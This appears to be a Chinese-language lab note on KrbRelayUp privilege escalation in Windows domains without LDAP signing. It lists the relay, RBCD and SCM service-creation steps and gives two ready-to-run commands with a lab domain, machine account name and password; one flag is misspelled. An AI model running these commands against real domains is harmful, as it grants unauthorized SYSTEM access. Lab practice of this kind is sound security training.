# krbrelayup
- 不开启 LDAP signing 的条件下实现域环境提权

云境 Endless/Tsclient

实现以下内容
- (可选）创建新机器账户（New-MachineAccount）
- 本地机器账户强制认证（KrbRelay）
- Kerberos 中继到 LDAP (KrbRelay)
- 为本地计算机添加 RBCD 权限并获取特权 ST (Rubeus)
- 使用上述 ST 验证本地服务管理器，并以 NT/SYSTEM 的身份创建新服务。(SCMUACBypass）

在未强制执行 LDAP 签名（默认设置）的 Windows 域环境中，这基本上是一种通用的无修复本地权限升级方法。

```ps1
.\KrbRelayUp.exe relay --doimain xiaorang.lab --CreateNewComputerAccount --ComputerName jiawei$ --ComputerPassword jiawei123... -cls c980e4c2-c178-4572-935d-a8a429884806
.\KrbRelayUp.exe spawn -m rbcd -d xiaorang.lab -dc DC01.xiaorang.lab -cn jiawei$ -cp jiawei123...
```